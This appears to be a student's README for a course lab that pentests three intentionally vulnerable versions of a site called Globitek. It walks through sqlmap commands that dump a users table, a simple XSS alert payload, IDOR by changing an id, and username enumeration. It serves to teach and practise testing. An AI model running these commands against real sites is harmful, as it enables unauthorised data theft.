# Project 8 - Pentesting Live Targets

Time spent: **8** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue
Vulnerability #1: **SQL Injection**
  * **Steps:**
    1. Use command: 'sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" --current-db' to retrieve the database the website is currently using (which is "globitek_blue")
    2. Use command: 'sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" -D globitek_blue --tables' to retrieve all of the tables that is in the database
    3. Use command: ''sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" --dump -D globitek_blue -T users' to retrieve all users' information
  * **GIF walkthrough:**
    * ![sqli](https://user-images.githubusercontent.com/31838335/39098942-fed0c51e-463f-11e8-82c4-e410750e79d1.gif)
    
Vulnerability #2: **Session Hijacking/Fixation**
  * **GIF walkthrough:**
    * ![session](https://user-images.githubusercontent.com/31838335/39490768-e5f18d20-4d57-11e8-9bd4-dcf86a85c0c9.gif)
    
## Green
Vulnerability #1: **Username Enumeration**
  * **Steps:**
    1. Type in username
    2. Type in a random password
    3. Teep submitting the wrong password multiple times until the "failed logins" message shows up
  * **GIF walkthrough:**
    * ![usernameenum](https://user-images.githubusercontent.com/31838335/39099064-ef761ec8-4641-11e8-8094-556642464fc3.gif)

Vulnerability #2: **Cross-Site Scripting**
  * **Steps:**
    1. Go to Contact
    2. Submit a feedback with malicious code: <script>alert('xss')</script>
  * **GIF walkthrough:**
    * ![xss](https://user-images.githubusercontent.com/31838335/39099083-3bf6dbde-4642-11e8-9e3f-1f8d585dd0d9.gif)

## **Red** version of Globitek website 
Vulnerability #1: **Insecure Direct Object Reference**
  * **Steps:**
    1. Go to https://35.184.168.159/blue/public/salesperson.php?id=1
    2. Change the value of id to 10 or 11 would reveal information that should not be revealed
  * **GIF walkthrough:**
    * ![idor](https://user-images.githubusercontent.com/31838335/39099090-56e74dac-4642-11e8-84f7-111537caefb6.gif)
Vulnerability #2: **Cross-Site Request Forgery**
  * **GIF walkthrough:**
    * ![crf](https://user-images.githubusercontent.com/31838335/39490692-a1d5aab8-4d57-11e8-8df6-815f79dde384.gif)
## **Bonus Objective 1:**
  * **Steps:**
    1. Since we know the name of the database we can use sqlmap to retrieve all information in the database
    2. Sample code: 'sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" -D globitek_blue'
  * **GIF walkthrough:**
    * ![bonus](https://user-images.githubusercontent.com/31838335/39099232-0afc4502-4645-11e8-90de-94fda8d999ae.gif)


## Notes

Describe any challenges encountered while doing the work
